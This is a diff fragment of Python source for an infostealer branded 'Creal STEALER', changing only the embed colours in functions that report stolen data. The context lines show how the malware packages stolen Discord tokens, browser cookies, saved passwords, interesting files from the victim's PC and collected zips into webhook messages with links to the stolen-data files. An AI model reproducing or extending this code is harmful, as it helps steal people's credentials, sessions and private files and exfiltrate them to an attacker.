@@ -342,7 +342,7 @@ def uploadToken(token, path):
         "content": f'{globalInfo()} | Found in `{path}`',
         "embeds": [
             {
-            "color": 14406413,
+            "color": 11927807,
             "fields": [
                 {
                     "name": ":rocket: Token:",
@@ -423,7 +423,7 @@ def upload(name, link):
                 {
                     "title": "Creal | Cookies Stealer",
                     "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [CrealCookies.txt]({link})",
-                    "color": 14406413,
+                    "color": 11927807,
                     "footer": {
                         "text": "@Creal STEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
@@ -450,7 +450,7 @@ def upload(name, link):
                 {
                     "title": "Creal | Password Stealer",
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [CrealPassword.txt]({link})",
-                    "color": 14406413,
+                    "color": 11927807,
                     "footer": {
                         "text": "@Creal STEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
@@ -470,7 +470,7 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                "color": 14406413,
+                "color": 11927807,
                 "fields": [
                     {
                     "name": "Interesting files found on user PC:",
@@ -675,7 +675,7 @@ def GatherZips(paths1, paths2, paths3):
             {
             "title": "Creal Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": 15781403,
+            "color": 11927807,
             "footer": {
                 "text": "@Creal STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
